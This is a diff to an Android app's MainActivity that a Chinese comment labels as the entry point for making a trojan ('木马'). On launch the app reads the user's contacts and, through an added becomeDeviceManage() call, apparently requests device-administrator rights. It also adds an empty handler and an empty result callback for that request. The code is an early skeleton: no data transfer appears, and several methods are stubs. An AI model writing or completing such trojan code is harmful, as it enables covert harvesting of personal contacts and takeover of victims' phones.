@@ -7,15 +7,30 @@ import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Message;
 import android.provider.ContactsContract;
 import android.support.v7.app.AppCompatActivity;
 import android.widget.TextView;
 
+/***
+ * 咪嘻木马制作入口
+ */
 public class MainActivity extends AppCompatActivity {
 
     static {
         System.loadLibrary("native-lib");
     }
+
+    private final int SECURITY = 0x001;
+    private Handler mSecurityNotify = new Handler() {
+        @Override
+        public void handleMessage(Message msg) {
+            switch (msg.what) {
+            }
+        }
+    };
+
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -24,6 +39,7 @@ public class MainActivity extends AppCompatActivity {
         TextView tv = (TextView) findViewById(R.id.sample_text);
         // tv.setText(stringFromJNI());
         readContacts();
+        becomeDeviceManage();
     }
 
     public native String stringFromJNI();
@@ -77,5 +93,14 @@ public class MainActivity extends AppCompatActivity {
         startActivityForResult(intent, 01010);
     }
 
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
 
+        if (requestCode == 01010) {
+            if (RESULT_OK == resultCode) {
+
+            }
+        }
+    }
 }
